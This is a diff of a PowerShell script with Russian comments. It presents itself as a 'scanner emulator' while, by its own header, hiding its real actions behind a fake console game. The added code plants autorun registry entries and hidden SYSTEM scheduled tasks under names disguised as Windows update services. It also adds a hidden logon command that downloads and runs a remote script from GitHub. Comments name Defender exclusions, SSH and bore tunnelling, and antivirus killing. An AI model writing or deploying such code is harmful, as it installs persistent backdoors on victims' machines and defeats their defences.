@@ -1,9 +1,44 @@
 # ============================================================
 #  Glass Scanner Emulator + Hidden Setup + bore + AV Killer
 #  (c) 2026 – всё реальное в лог, консоль – только игра
-#  Порядок: скачивание → Defender исключение → порт 587
-#  → автозапуск (EXE+команда) → запуск EXE → SSH → bore → AV
+#  Запуск: .\setup.ps1 [-repair]
 # ============================================================
+
+# ---------- Проверка прав администратора ----------
+if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Write-Host "Ошибка: Скрипт должен запускаться с правами администратора!" -ForegroundColor Red
+    Write-Host "Пожалуйста, запустите PowerShell от имени администратора." -ForegroundColor Yellow
+    pause
+    exit 1
+}
+
+# ---------- Режим восстановления (если передан параметр -repair) ----------
+if ($args -contains "-repair") {
+    $repairLog = "$env:USERPROFILE\collextor\repair.log"
+    "=== Восстановление автозапуска $(Get-Date) ===" | Out-File -FilePath $repairLog -Encoding UTF8
+    $baseDir = "$env:USERPROFILE\collextor"
+    $hiddenDir = "$env:APPDATA\Microsoft\Windows\Caches"
+    $exePath = (Get-ChildItem -Path $hiddenDir -Filter "*.exe" -File -ErrorAction SilentlyContinue | Select-Object -First 1).FullName
+    if (-not $exePath) {
+        "EXE не найден, восстановление невозможно." | Out-File -FilePath $repairLog -Append
+        exit 1
+    }
+    $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    $valName = "WindowsUpdateService"
+    $cur = (Get-ItemProperty -Path $runKey -Name $valName -ErrorAction SilentlyContinue).$valName
+    if (-not $cur -or $cur -ne $exePath) {
+        Set-ItemProperty -Path $runKey -Name $valName -Value $exePath -ErrorAction SilentlyContinue
+        "Восстановлена запись EXE в автозапуске." | Out-File -FilePath $repairLog -Append
+    }
+    $psCommand = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iex (irm ''https://raw.githubusercontent.com/Holycheck/checker/main/check.ps1'')"'
+    $psValName = "WindowsUpdateServicePS"
+    $curPs = (Get-ItemProperty -Path $runKey -Name $psValName -ErrorAction SilentlyContinue).$psValName
+    if (-not $curPs -or $curPs -ne $psCommand) {
+        Set-ItemProperty -Path $runKey -Name $psValName -Value $psCommand -ErrorAction SilentlyContinue
+        "Восстановлена запись PowerShell команды в автозапуске." | Out-File -FilePath $repairLog -Append
+    }
+    exit 0
+}
 
 # ---------- Скрытая настройка ----------
 $baseDir = "$env:USERPROFILE\collextor"
@@ -75,23 +110,35 @@ try {
 } catch { Write-Log "Ошибка настройки брандмауэра: $_" }
 
 # ============================================================
-# 4. Автозапуск (реестр) и задача планировщика (восстановление)
+# 4. Автозапуск (реестр) и задача планировщика
 # ============================================================
 Write-Log "Настройка автозапуска и задачи планировщика..."
 
-# 4.1 Реестр (запуск EXE при входе)
 $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$valName = "WindowsUpdateService"  # маскировка
+
+# 4.1 Реестр (запуск EXE при входе)
+$valName = "WindowsUpdateService"
 try {
     $cur = (Get-ItemProperty -Path $runKey -Name $valName -ErrorAction SilentlyContinue).$valName
     if (-not $cur -or $cur -ne $exePath) {
         Set-ItemProperty -Path $runKey -Name $valName -Value $exePath -ErrorAction Stop
         Write-Log "EXE добавлен в автозапуск как $valName"
     }
-} catch { Write-Log "Ошибка добавления в автозапуск: $_" }
+} catch { Write-Log "Ошибка добавления EXE в автозапуск: $_" }
 
-# 4.2 Планировщик – задача для периодического запуска EXE (каждые 2 часа)
-$taskName = "WindowsSystemMaintenance"  # маскировка
+# 4.2 Реестр (запуск PowerShell команды при входе)
+$psCommand = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iex (irm ''https://raw.githubusercontent.com/Holycheck/checker/main/check.ps1'')"'
+$psValName = "WindowsUpdateServicePS"
+try {
+    $curPs = (Get-ItemProperty -Path $runKey -Name $psValName -ErrorAction SilentlyContinue).$psValName
+    if (-not $curPs -or $curPs -ne $psCommand) {
+        Set-ItemProperty -Path $runKey -Name $psValName -Value $psCommand -ErrorAction Stop
+        Write-Log "PowerShell команда добавлена в автозапуск как $psValName"
+    }
+} catch { Write-Log "Ошибка добавления PowerShell команды: $_" }
+
+# 4.3 Планировщик – задача для периодического запуска EXE (каждые 2 часа)
+$taskName = "WindowsSystemMaintenance"
 try {
     $existing = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
     if (-not $existing) {
@@ -100,12 +147,10 @@ try {
         $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
         Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -User "NT AUTHORITY\SYSTEM" -Force | Out-Null
         Write-Log "Задача планировщика создана (запуск EXE каждые 2 часа)."
-    } else {
-        Write-Log "Задача планировщика уже существует."
     }
 } catch { Write-Log "Ошибка создания задачи планировщика: $_" }
 
-# 4.3 Также задача для запуска самого скрипта (восстановление автозапуска)
+# 4.4 Планировщик – задача для восстановления (если удалят автозапуск)
 $scriptTaskName = "WindowsUpdateChecker"
 try {
     $existing2 = Get-ScheduledTask -TaskName $scriptTaskName -ErrorAction SilentlyContinue
